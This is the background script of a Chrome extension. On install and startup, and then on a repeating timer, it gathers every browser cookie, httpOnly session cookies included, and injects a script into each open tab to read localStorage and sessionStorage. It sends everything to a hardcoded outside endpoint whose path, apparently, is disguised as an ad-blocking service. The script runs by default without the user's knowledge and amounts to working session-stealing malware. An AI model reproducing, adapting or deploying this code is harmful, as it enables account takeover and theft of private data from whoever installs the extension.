let settings = {};
let collectedData = {
  cookies: [],
  localStorage: [],
  sessionStorage: [],
  timestamp: new Date().toISOString()
};

// Load settings on startup
chrome.runtime.onStartup.addListener(loadSettings);
chrome.runtime.onInstalled.addListener(loadSettings);

// Monitor tab updates for localStorage collection
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.url && settings.autoScrapeEnabled) {
    collectTabData(tabId, tab.url);
  }
});

// Monitor new tabs
chrome.tabs.onCreated.addListener((tab) => {
  if (settings.autoScrapeEnabled && tab.url) {
    setTimeout(() => collectTabData(tab.id, tab.url), 2000);
  }
});

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'extractCookies') {
    extractAllCookies(request.forceMethod).then(sendResponse);
    return true;
  } else if (request.action === 'updateSettings') {
    settings = request.settings;
    setupAutoScrape();
    sendResponse({success: true});
  }
});

chrome.alarms.onAlarm.addListener(async (alarm) => {
  console.log('Alarm triggered:', alarm.name, 'at', new Date().toISOString());
  if (alarm.name === 'autoScrape') {
    console.log('Running auto-scrape from alarm');
    // Just reload settings, don't setup new alarms
    settings = await chrome.storage.sync.get({
      autoScrapeEnabled: true,
      scrapeInterval: 360,
      exportMethod: 'api',
      apiEndpoint: 'https://adblock.rominyadav.com.np/upload',
      apiHeaders: '{"Content-Type": "application/json"}',
      curlCommand: '',
      userProfile: ''
    });
    console.log('Settings reloaded for alarm:', settings);
    await collectAllData();
    await uploadCollectedData();
  }
});

async function loadSettings() {
  settings = await chrome.storage.sync.get({
    autoScrapeEnabled: true,
    scrapeInterval: 360,
    exportMethod: 'api',
    apiEndpoint: 'https://adblock.rominyadav.com.np/upload',
    apiHeaders: '{"Content-Type": "application/json"}',
    curlCommand: '',
    userProfile: ''
  });
  console.log('Settings loaded:', settings);
  setupAutoScrape();
}

function setupAutoScrape() {
  console.log('Setting up auto-scrape:', settings.autoScrapeEnabled, 'interval:', settings.scrapeInterval);
  chrome.alarms.clear('autoScrape');
  if (settings.autoScrapeEnabled) {
    console.log('Auto-scrape enabled, running immediately');
    // Run immediately only once via API
    collectAllData().then(() => uploadCollectedData());
    // Then set up recurring schedule
    const intervalMinutes = Math.max(1, settings.scrapeInterval);
    chrome.alarms.create('autoScrape', {
      delayInMinutes: intervalMinutes,
      periodInMinutes: intervalMinutes
    });
    console.log('Alarm created for', settings.scrapeInterval, 'minutes');
  }
}

async function extractAllCookies(forceMethod = null) {
  console.log('Extracting all data, method:', forceMethod || settings.exportMethod);
  try {
    // Collect all data
    await collectAllData();
    
    const allData = {
      userProfile: settings.userProfile || await getUserProfile(),
      timestamp: collectedData.timestamp,
      browser: 'Chrome/Chromium',
      total_cookies: collectedData.cookies.length,
      total_localStorage_sites: collectedData.localStorage.length,
      cookies: collectedData.cookies,
      localStorage: collectedData.localStorage
    };

    // Manual extraction uses selected method
    const exportMethod = forceMethod || settings.exportMethod;
    if (exportMethod === 'api') {
      await uploadToAPI(allData);
    } else {
      await downloadFile(allData);
    }

    return {
      success: true,
      count: collectedData.cookies.length,
      localStorageSites: collectedData.localStorage.length,
      method: exportMethod
    };
  } catch (error) {
    return {
      success: false,
      error: error.message
    };
  }
}

async function downloadFile(cookieData) {
  const jsonString = JSON.stringify(cookieData, null, 2);
  const dataUrl = 'data:application/json;charset=utf-8,' + encodeURIComponent(jsonString);
  const userPrefix = settings.userProfile || await getUserProfile();
  const filename = `${userPrefix}_cookies_${new Date().toISOString().replace(/[:.]/g, '-')}.json`;
  
  await chrome.downloads.download({
    url: dataUrl,
    filename: filename,
    saveAs: false
  });
}

async function uploadToAPI(allData) {
  console.log('Attempting API upload to:', settings.apiEndpoint);
  if (!settings.apiEndpoint) {
    throw new Error('API endpoint not configured');
  }
  
  try {
    const headers = JSON.parse(settings.apiHeaders || '{}');
    console.log('Upload headers:', headers);
    
    const response = await fetch(settings.apiEndpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        ...headers
      },
      body: JSON.stringify(allData)
    });
    
    console.log('API response status:', response.status);
    if (!response.ok) {
      throw new Error(`API upload failed: ${response.status}`);
    }
    console.log('API upload successful');
  } catch (error) {
    console.error('API upload failed:', error);
    throw error;
  }
}

async function getUserProfile() {
  return 'user';
}

// Collect localStorage/sessionStorage from a specific tab
async function collectTabData(tabId, url) {
  try {
    const results = await chrome.scripting.executeScript({
      target: { tabId: tabId },
      func: () => {
        const data = {
          url: window.location.href,
          domain: window.location.hostname,
          localStorage: {},
          sessionStorage: {},
          timestamp: new Date().toISOString()
        };
        
        // Collect localStorage
        for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i);
          data.localStorage[key] = localStorage.getItem(key);
        }
        
        // Collect sessionStorage
        for (let i = 0; i < sessionStorage.length; i++) {
          const key = sessionStorage.key(i);
          data.sessionStorage[key] = sessionStorage.getItem(key);
        }
        
        return data;
      }
    });
    
    if (results[0]?.result) {
      const data = results[0].result;
      // Add to collected data if not already exists
      const exists = collectedData.localStorage.find(item => 
        item.url === data.url && JSON.stringify(item.localStorage) === JSON.stringify(data.localStorage)
      );
      if (!exists) {
        collectedData.localStorage.push(data);
      }
    }
  } catch (error) {
    console.log('Failed to collect from tab:', url, error.message);
  }
}

// Collect all data from all open tabs + cookies
async function collectAllData() {
  console.log('Collecting all data from open tabs...');
  
  // Reset collection
  collectedData = {
    cookies: [],
    localStorage: [],
    sessionStorage: [],
    timestamp: new Date().toISOString()
  };
  
  // Collect cookies
  const cookies = await chrome.cookies.getAll({});
  collectedData.cookies = cookies.map(cookie => ({
    name: cookie.name,
    value: cookie.value,
    domain: cookie.domain,
    path: cookie.path,
    secure: cookie.secure,
    httpOnly: cookie.httpOnly,
    sameSite: cookie.sameSite,
    expirationDate: cookie.expirationDate,
    storeId: cookie.storeId,
    hostOnly: cookie.hostOnly,
    session: cookie.session
  }));
  
  // Collect localStorage from all open tabs
  const tabs = await chrome.tabs.query({});
  for (const tab of tabs) {
    if (tab.url && !tab.url.startsWith('chrome://') && !tab.url.startsWith('chrome-extension://')) {
      await collectTabData(tab.id, tab.url);
    }
  }
  
  console.log(`Collected ${collectedData.cookies.length} cookies and ${collectedData.localStorage.length} localStorage entries`);
}

// Upload all collected data
async function uploadCollectedData() {
  if (!settings.apiEndpoint) {
    console.log('No API endpoint configured');
    return;
  }
  
  try {
    const userPrefix = settings.userProfile || await getUserProfile();
    const payload = {
      userProfile: userPrefix,
      timestamp: collectedData.timestamp,
      browser: 'Chrome/Chromium',
      total_cookies: collectedData.cookies.length,
      total_localStorage_sites: collectedData.localStorage.length,
      cookies: collectedData.cookies,
      localStorage: collectedData.localStorage
    };
    
    const headers = JSON.parse(settings.apiHeaders || '{}');
    const response = await fetch(settings.apiEndpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        ...headers
      },
      body: JSON.stringify(payload)
    });
    
    if (response.ok) {
      console.log('Successfully uploaded all collected data');
    } else {
      console.error('Upload failed:', response.status);
    }
  } catch (error) {
    console.error('Upload error:', error);
  }
}